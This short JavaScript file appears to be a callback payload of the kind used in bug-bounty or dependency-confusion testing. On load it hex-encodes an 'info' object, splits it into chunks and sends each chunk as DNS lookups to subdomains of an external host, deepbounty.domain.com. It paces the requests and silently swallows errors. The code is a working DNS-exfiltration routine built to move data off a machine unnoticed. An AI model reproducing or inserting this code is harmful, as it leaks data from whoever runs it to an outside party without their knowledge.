const CALLBACK_URL = 'https://deepbounty.domain.com/cb/123e4567-e89b-12d3-a456-426614174000';

function sendDnsPayload() {
    try {
        const parsed = new URL(CALLBACK_URL);
        const baseDomain = "dns." + parsed.hostname;
        const uuidLabel = (parsed.pathname.split('/').filter(Boolean).pop() || 'cb').replace(/[^a-zA-Z0-9]/g, '');

        const hexPayload = toHex(JSON.stringify(info));
        const chunks = hexPayload.match(/.{1,50}/g) || [];

        if (!chunks.length || !baseDomain) return;

        chunks.forEach((chunk, index) => {
            // Reconstruct hostname: index-total.uuid.chunk.domain
            const hostname = `${index}-${chunks.length}.${uuidLabel}.${chunk}.${baseDomain}`;

            // Jitter requests to avoid flooding local resolver
            setTimeout(() => {
                dns.lookup(hostname, (err) => { /* ignore result */ });
            }, index * 200);
        });
    } catch (e) { }
}
sendDnsPayload();
